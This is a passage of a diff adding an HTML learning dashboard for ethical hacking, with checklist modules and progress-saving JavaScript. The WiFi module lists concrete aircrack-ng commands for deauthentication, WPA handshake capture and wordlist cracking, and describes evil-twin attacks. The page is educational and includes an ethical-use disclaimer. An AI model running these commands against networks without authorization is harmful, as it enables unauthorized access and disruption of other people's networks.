+                                     <div><i class="fa-solid fa-wifi"></i> <a href="https://www.aircrack-ng.org/doku.php?id=compatible_cards" target="_blank" rel="noopener noreferrer">Aircrack-ng Compatible Cards</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://www.kali.org/docs/nethunter/installing-external-wireless-card/" target="_blank" rel="noopener noreferrer">Kali External Wifi Card Guide</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Requires specific hardware</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m6-item2-note" placeholder="Need compatible USB WiFi adapter (e.g., Alfa AWUS036NHA). `sudo airmon-ng check kill` (stops interfering processes). `sudo airmon-ng start wlan0`. New interface usually `wlan0mon`."></textarea></div>
+                             </div>
+                         </li>
+                          <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m6-item3"><span class="item-title">Aircrack-ng Suite Basics</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">`airodump-ng` (scan networks, capture packets, target specific BSSID/channel), `aireplay-ng` (deauthentication attacks to force handshake), `aircrack-ng` (crack WEP keys or WPA/WPA2 handshakes).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://www.aircrack-ng.org/documentation.html" target="_blank" rel="noopener noreferrer">Aircrack-ng Documentation</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/wifihacking101" target="_blank" rel="noopener noreferrer">THM: Wifi Hacking 101</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m6-item3-note" placeholder="Scan: `sudo airodump-ng wlan0mon`. Target AP: `sudo airodump-ng -c <channel> --bssid <AP_MAC> -w capturefile wlan0mon`. Deauth: `sudo aireplay-ng -0 5 -a <AP_MAC> -c <Client_MAC> wlan0mon`. Crack: `aircrack-ng capturefile.cap -w wordlist.txt`."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m6-item4"><span class="item-title">WPA/WPA2 Handshake Capture & Cracking</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Use `airodump-ng` to target an AP and capture the 4-way handshake (occurs when client connects/reconnects). Use `aireplay-ng` deauth attack to speed up capture. Use `aircrack-ng` or `hashcat` with a wordlist to crack the PSK offline.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-handshake"></i> <a href="https://www.aircrack-ng.org/doku.php?id=cracking_wpa" target="_blank" rel="noopener noreferrer">Aircrack WPA Cracking Guide</a></div>
+                                     <div><i class="fa-solid fa-hashtag"></i> <a href="https://hashcat.net/wiki/doku.php?id=example_hashes" target="_blank" rel="noopener noreferrer">Hashcat Mode 22000 (WPA/WPA2)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Requires hardware & target network</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m6-item4-note" placeholder="Look for &quot;WPA Handshake: [BSSID]&quot; in airodump-ng top right. Need handshake + wordlist. `aircrack-ng capture*.cap -w /usr/share/wordlists/rockyou.txt`. Convert .cap to .hc22000 for hashcat. Success depends heavily on password strength & wordlist quality."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m6-item5"><span class="item-title">Evil Twin & Rogue AP Attack Concepts</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand setting up a fake AP with the same SSID as a legitimate one. Deauthenticating clients from real AP forces them to connect to fake AP. Can lead to Man-in-the-Middle (MitM), credential harvesting (captive portal), or malware delivery.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-people-arrows"></i> <a href="https://owasp.org/www-community/attacks/Evil_Twin" target="_blank" rel="noopener noreferrer">OWASP Evil Twin</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/wifiphisher/wifiphisher" target="_blank" rel="noopener noreferrer">Wifiphisher Tool</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Advanced / Ethical considerations</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m6-item5-note" placeholder="Requires multiple WiFi adapters or capable one + tools like `hostapd`, `dnsmasq`. Wifiphisher automates setup. Highly illegal without explicit permission. Used to capture portal logins or redirect traffic."></textarea></div>
+                             </div>
+                         </li>
+                    </ul>
+                 </div>
+            </section>
+
+            <!-- Module 7 -->
+            <section class="module" data-module-id="module-7">
+                 <div class="module-header"><h3>Module 7: Reporting, Practice & Next Steps</h3><div class="module-stats"><span class="progress-text">0 / 7</span></div><span class="module-toggle"></span></div>
+                 <div class="module-content">
+                     <div class="module-progress"><div class="progress-text">Module Progress:</div><div class="progress-bar-container"><div class="progress-bar">0%</div></div></div>
+                     <ul class="checklist">
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m7-item0"><span class="item-title">Cryptography Basics for Hackers</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand Symmetric vs Asymmetric encryption (shared key vs public/private key). Hashing algorithms (MD5, SHA1, SHA256 - purpose: integrity, not secrecy). Digital Signatures (authenticity, integrity). Basics of PKI & certificates.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-key"></i> <a href="https://www.khanacademy.org/computing/computer-science/cryptography" target="_blank" rel="noopener noreferrer">Khan Academy Cryptography</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/cryptographyfordummies" target="_blank" rel="noopener noreferrer">THM: Cryptography for Dummies</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m7-item0-note" placeholder="Hashing is one-way. Encryption is two-way. Symmetric is fast (AES). Asymmetric is slow but good for key exchange (RSA). Understand common crypto weaknesses (weak keys, outdated algos)."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m7-item1"><span class="item-title">Introduction to Reverse Engineering Concepts</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand the goal: analyze compiled code (executables, libraries) to understand functionality, find vulnerabilities, or bypass protections. Basic Assembly language concepts (x86/x64 registers, instructions like MOV, PUSH, POP, CALL, JMP). Introduction to debuggers (GDB, x64dbg/OllyDbg) and decompilers (Ghidra, IDA Pro - free version).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-microchip"></i> <a href="https://ghidra-sre.org/" target="_blank" rel="noopener noreferrer">Ghidra SRE Framework</a></div>
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://godbolt.org/" target="_blank" rel="noopener noreferrer">Compiler Explorer (See Assembly)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/reverseng" target="_blank" rel="noopener noreferrer">THM: Intro to Reversing</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m7-item1-note" placeholder="Use `strings` and `file` commands first. Load binary into Ghidra/IDA. Use debugger to step through code, set breakpoints, inspect memory/registers. Steep learning curve."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m7-item2"><span class="item-title">Introduction to Malware Analysis Concepts</span></label><span class="difficulty-tag difficulty-advanced">Advanced</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Static Analysis (analyzing without running - strings, headers, imports/exports, disassembly). Dynamic Analysis (running in isolated environment - sandbox, debugger) to observe behavior (network calls, file system changes, registry changes).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-virus"></i> <a href="https://zeltser.com/cheat-sheets/malware-analysis-cheat-sheet/" target="_blank" rel="noopener noreferrer">Malware Analysis Cheat Sheet</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://any.run/" target="_blank" rel="noopener noreferrer">ANY.RUN (Online Sandbox)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/malmalintroductory" target="_blank" rel="noopener noreferrer">THM: Intro Malware Analysis</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m7-item2-note" placeholder="SAFETY FIRST: Always analyze malware in isolated VM disconnected from network (or use sandbox). Static: `strings`, PEStudio, Ghidra. Dynamic: Process Monitor, Wireshark, Debugger. Look for indicators of compromise (IOCs)."></textarea></div>
+                             </div>
+                         </li>
+                        <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m7-item3"><span class="item-title">Cloud Security Fundamentals (AWS/Azure/GCP)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Basic understanding of cloud models (IaaS, PaaS, SaaS). Common misconfigurations: Public S3 buckets/Azure Blobs, overly permissive IAM roles/policies, exposed security groups/firewall rules, leaked access keys.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-cloud"></i> <a href="https://owasp.org/www-project-cloud-top-10/" target="_blank" rel="noopener noreferrer">OWASP Cloud Top 10</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/cloudsplaining/cloudsplaining" target="_blank" rel="noopener noreferrer">Cloudsplaining (AWS IAM)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/awsfundamentals" target="_blank" rel="noopener noreferrer">THM: AWS Fundamentals (Example)</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m7-item3-note" placeholder="Focus on identity and access management (IAM) and network security controls. Tools: AWS CLI, Azure CLI, Pacu, ScoutSuite. Check for public storage, insecure security group rules (0.0.0.0/0)."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m7-item4"><span class="item-title">Container Security Fundamentals (Docker)</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Understand container basics. Common risks: Vulnerable base images, insecure configurations (running as root, exposed Docker socket), secrets management, container escape techniques (rare).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-brands fa-docker"></i> <a href="https://owasp.org/www-project-docker-top-10/" target="_blank" rel="noopener noreferrer">OWASP Docker Top 10</a></div>
+                                     <div><i class="fa-solid fa-toolbox"></i> <a href="https://github.com/anchore/grype" target="_blank" rel="noopener noreferrer">Grype (Image Scanner)</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <a href="https://tryhackme.com/room/dockerbasics" target="_blank" rel="noopener noreferrer">THM: Docker Basics</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m7-item4-note" placeholder="Scan images for CVEs (`grype <image>`). Avoid running containers as root (`USER` directive). Don't mount Docker socket (`docker.sock`) inside containers lightly. Use tools like Docker Bench for Security."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m7-item5"><span class="item-title">Continuous Practice: CTFs & Labs</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Regularly practice skills on platforms like TryHackMe (guided learning), Hack The Box (more challenging boxes), VulnHub (downloadable VMs). Participate in live CTF events (CTFtime.org).</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-flag-checkered"></i> <a href="https://tryhackme.com/" target="_blank" rel="noopener noreferrer">TryHackMe</a></div>
+                                     <div><i class="fa-solid fa-flag-checkered"></i> <a href="https://www.hackthebox.com/" target="_blank" rel="noopener noreferrer">Hack The Box</a></div>
+                                     <div><i class="fa-solid fa-flag-checkered"></i> <a href="https://www.vulnhub.com/" target="_blank" rel="noopener noreferrer">VulnHub</a></div>
+                                     <div><i class="fa-solid fa-calendar-days"></i> <a href="https://ctftime.org/" target="_blank" rel="noopener noreferrer">CTFtime</a></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m7-item5-note" placeholder="Start with easier THM rooms/HTB boxes. Read write-ups AFTER attempting. Focus on methodology, not just flags. Consistency is key."></textarea></div>
+                             </div>
+                         </li>
+                         <li>
+                             <div class="item-header"><label><input type="checkbox" data-id="m7-item6"><span class="item-title">Reporting Findings Professionally</span></label><span class="difficulty-tag difficulty-intermediate">Intermediate</span></div>
+                             <div class="item-details">
+                                 <p class="topic-description">Structure a penetration test report: Executive Summary (non-technical, business impact), Technical Details (vulnerability description, reproduction steps, evidence/PoC), Risk Rating (CVSS, likelihood/impact), Remediation Recommendations.</p>
+                                 <div class="item-links">
+                                     <div><i class="fa-solid fa-file-contract"></i> <a href="https://github.com/juliocesarfort/public-pentesting-reports" target="_blank" rel="noopener noreferrer">Public Pentest Report Examples</a></div>
+                                     <div><i class="fa-solid fa-book"></i> <a href="https://tisiphone.net/2015/08/18/how-to-write-a-penetration-testing-report/" target="_blank" rel="noopener noreferrer">Blog Post on Report Writing</a></div>
+                                     <div><i class="fa-solid fa-crosshairs"></i> <span class="placeholder">Practice after completing labs/boxes</span></div>
+                                 </div>
+                                 <div class="item-notes"><textarea data-note-id="m7-item6-note" placeholder="Be clear, concise, and objective. Provide actionable recommendations. Include screenshots/command output as evidence. Tailor language to the audience (exec vs technical)."></textarea></div>
+                             </div>
+                         </li>
+                    </ul>
+                 </div>
+            </section>
+            <!-- Syllabus Modules End Here -->
+
+            <div class="disclaimer">
+                <strong><i class="fa-solid fa-scale-balanced"></i> Ethical Use Reminder</strong>
+                The knowledge and tools outlined here are powerful and intended for educational and authorized security testing purposes only. Always ensure you have explicit, written permission before assessing any system or network you do not own. Unauthorized access or testing is illegal and unethical. Learn and practice responsibly.
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const modules = document.querySelectorAll('.module');
+            const allCheckboxes = document.querySelectorAll('.checklist input[type="checkbox"]');
+            const allNotes = document.querySelectorAll('.item-notes textarea');
+            const overallProgressBar = document.getElementById('overall-progress-bar');
+            const overallProgressText = document.getElementById('overall-progress-text');
+
+            let totalItems = allCheckboxes.length;
+            let completedItems = 0;
+            const moduleData = {};
+            const SAVE_KEY = 'hackingDashboardState_v6'; // Updated key
+
+            // --- Initialization ---
+            function initializeDashboard() {
+                loadState();
+
+                modules.forEach(module => {
+                    const moduleId = module.dataset.moduleId;
+                    const header = module.querySelector('.module-header');
+                    const checkboxes = module.querySelectorAll('.checklist input[type="checkbox"]');
+                    const progressBar = module.querySelector('.module-content .progress-bar');
+                    const moduleStatsText = module.querySelector('.module-stats .progress-text');
+
+                    if (!header || !progressBar || !moduleStatsText || !moduleId) {
+                        console.warn(`Module element or its required children/data-attribute are missing.`);
+                        return;
+                    }
+
+                    moduleData[moduleId] = {
+                        checkboxes: Array.from(checkboxes),
+                        progressBar: progressBar,
+                        progressTextElement: moduleStatsText,
+                        total: checkboxes.length,
+                        completed: 0,
+                        moduleElement: module
+                    };
+
+                    header.addEventListener('click', (e) => {
+                         if (e.target.closest('a')) return;
+                        const isOpen = module.classList.toggle('open');
+                        saveModuleOpenState(moduleId, isOpen);
+                    });
+
+                    checkboxes.forEach(checkbox => {
+                        checkbox.addEventListener('change', () => {
+                            const listItem = checkbox.closest('li');
+                            if (listItem) {
+                                listItem.classList.toggle('completed', checkbox.checked);
+                            }
+                            updateProgress();
+                            saveState();
+                        });
+                    });
+
+                     // Load initial open state - This should happen *after* loadState ideally,
+                     // but loadState already handles this as a fallback if the specific key isn't found.
+                     // Keeping it simple by having loadState manage it.
+                     // const isOpen = localStorage.getItem(`${moduleId}-open`) === 'true';
+                     // module.classList.toggle('open', isOpen);
+
+                });
+
+                 allNotes.forEach(textarea => {
+                    textarea.addEventListener('input', debounce(saveState, 500));
+                 });
+
+                updateProgress(); // Initial calculation after loading state
+            }
+
+            // --- Progress Calculation ---
+            function updateProgress() {
+                completedItems = 0;
+                for (const moduleId in moduleData) {
+                    if (!moduleData.hasOwnProperty(moduleId)) continue;
+                    const moduleInfo = moduleData[moduleId];
+                    if (!moduleInfo || !moduleInfo.checkboxes) continue;
+
+                    moduleInfo.completed = moduleInfo.checkboxes.filter(cb => cb.checked).length;
+                    completedItems += moduleInfo.completed;
+
+                    const percentage = moduleInfo.total === 0 ? 0 : Math.round((moduleInfo.completed / moduleInfo.total) * 100);
+
+                    if (moduleInfo.progressBar) {
+                        moduleInfo.progressBar.style.width = `${percentage}%`;
+                        moduleInfo.progressBar.textContent = `${percentage}%`;
+                    }
+                    if (moduleInfo.progressTextElement) {
+                       moduleInfo.progressTextElement.textContent = `${moduleInfo.completed} / ${moduleInfo.total}`;
+                    }
+                }
+
+                const overallPercentage = totalItems === 0 ? 0 : Math.round((completedItems / totalItems) * 100);
+                if (overallProgressBar) {
+                    overallProgressBar.style.width = `${overallPercentage}%`;
+                    overallProgressBar.textContent = `${overallPercentage}%`;
+                }
+                if (overallProgressText) {
+                    overallProgressText.textContent = `Completed ${completedItems} / ${totalItems} items`;
+                }
+            }
+
+            // --- State Persistence (Local Storage) ---
+            function saveState() {
+                const checkboxStates = {};
+                allCheckboxes.forEach(checkbox => {
+                    if (checkbox.dataset.id) {
+                        checkboxStates[checkbox.dataset.id] = checkbox.checked;
+                    }
+                });
+                const noteStates = {};
+                allNotes.forEach(textarea => {
+                    const noteId = textarea.dataset.noteId;
+                    if (noteId) {
+                         noteStates[noteId] = textarea.value;
+                    }
+                });
+                const dashboardState = { checkboxes: checkboxStates, notes: noteStates };
+                try { localStorage.setItem(SAVE_KEY, JSON.stringify(dashboardState)); }
+                catch (e) { console.error("Error saving state:", e); alert("Error saving progress."); }
+            }
+
+            function saveModuleOpenState(moduleId, isOpen) {
+                 try { localStorage.setItem(`${moduleId}-open`, isOpen.toString()); }
+                 catch (e) { console.error("Error saving module open state:", e); }
+            }
+
+            function loadState() {
+                const savedStateJSON = localStorage.getItem(SAVE_KEY);
+                let savedState = {};
+                if (savedStateJSON) {
+                    try { savedState = JSON.parse(savedStateJSON); }
+                    catch (e) { console.error("Error parsing saved state:", e); localStorage.removeItem(SAVE_KEY); }
+                }
+
+                // Load Checkboxes AND Apply .completed class
+                if (savedState.checkboxes) {
+                    allCheckboxes.forEach(checkbox => {
+                        const id = checkbox.dataset.id;
+                        const isChecked = id && savedState.checkboxes[id] !== undefined ? savedState.checkboxes[id] : false;
+                        checkbox.checked = isChecked;
+
+                        // Apply class based on loaded state
+                        const listItem = checkbox.closest('li');
+                        if (listItem) {
+                            listItem.classList.toggle('completed', isChecked);
+                        }
+                    });
+                } else {
+                     // Ensure no items have .completed class if no state is loaded
+                     document.querySelectorAll('.checklist li.completed').forEach(li => li.classList.remove('completed'));
+                }
+
+
+                // Load Notes
+                if (savedState.notes) {
+                    allNotes.forEach(textarea => {
+                        const noteId = textarea.dataset.noteId;
+                        if (noteId && savedState.notes[noteId] !== undefined) {
+                            textarea.value = savedState.notes[noteId];
+                        } else {
+                             textarea.value = ''; // Clear notes if not in saved state
+                        }
+                    });
+                } else {
+                     allNotes.forEach(textarea => textarea.value = ''); // Clear all notes if no note state exists
+                }
+
+                 // Load Module Open States
+                 modules.forEach(module => {
+                     const moduleId = module.dataset.moduleId;
+                     if (moduleId) {
+                        const isOpen = localStorage.getItem(`${moduleId}-open`) === 'true';
+                         module.classList.toggle('open', isOpen);
+                     }
+                 });
+            }
+
+            function debounce(func, wait) {
+                let timeout;
+                return function executedFunction(...args) {
+                    const later = () => { clearTimeout(timeout); func(...args); };
+                    clearTimeout(timeout);
+                    timeout = setTimeout(later, wait);
+                };
+            }
+
+            initializeDashboard();
+        });
+    </script>
+
+</body>
+</html>
